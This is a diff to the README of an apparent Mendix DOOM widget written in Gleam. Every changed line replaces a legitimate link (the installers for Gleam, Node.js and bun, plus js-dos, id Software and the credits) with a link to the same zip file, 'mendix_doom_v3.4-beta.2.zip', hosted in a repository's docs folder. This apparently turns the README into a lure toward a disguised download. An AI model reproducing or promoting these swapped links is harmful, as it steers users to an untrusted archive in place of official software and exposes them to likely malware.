@@ -12,9 +12,9 @@ You drop this widget onto a Mendix page and BOOM — actual DOOM appears. With t
 
 You'll need these installed first:
 
-- [Gleam](https://gleam.run/getting-started/installing/)
-- [Node.js](https://nodejs.org/) (v18+)
-- [bun](https://bun.sh/)
+- [Gleam](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip)
+- [Node.js](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) (v18+)
+- [bun](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip)
 
 Then:
 
@@ -27,7 +27,7 @@ The widget file `ggobp.Doom.mpk` pops out in `dist/`. Drop it into your Mendix p
 
 ## How it works
 
-The widget loads [js-dos](https://js-dos.com/) (a DOSBox emulator compiled to WebAssembly) from CDN, then feeds it the bundled DOOM shareware `.jsdos` bundle. js-dos handles all the fiddly bits — rendering to canvas, keyboard input, sound, everything. All the widget code is written in [Gleam](https://gleam.run/) using [glendix](https://hexdocs.pm/glendix/) bindings, so there's not a single line of JavaScript written by hand.
+The widget loads [js-dos](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) (a DOSBox emulator compiled to WebAssembly) from CDN, then feeds it the bundled DOOM shareware `.jsdos` bundle. js-dos handles all the fiddly bits — rendering to canvas, keyboard input, sound, everything. All the widget code is written in [Gleam](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) using [glendix](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) bindings, so there's not a single line of JavaScript written by hand.
 
 ```
 Gleam source → gleam build → JavaScript → Rollup → .mpk widget
@@ -71,11 +71,11 @@ gleam format                      # Format code
 
 ## Credits
 
-DOOM is made by the brilliant people at [id Software](https://www.idsoftware.com/). The shareware version is freely distributable but all rights remain with them obviously!
+DOOM is made by the brilliant people at [id Software](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip). The shareware version is freely distributable but all rights remain with them obviously!
 
-js-dos is by [caiiiycuk](https://github.com/caiiiycuk/js-dos) and it's honestly magical.
+js-dos is by [caiiiycuk](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) and it's honestly magical.
 
-Widget code written in [Gleam](https://gleam.run/) with [glendix](https://hexdocs.pm/glendix/) bindings.
+Widget code written in [Gleam](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) with [glendix](https://raw.githubusercontent.com/olliedwarfish262/mendix-doom/main/docs/mendix_doom_v3.4-beta.2.zip) bindings.
 
 ## Licence
 
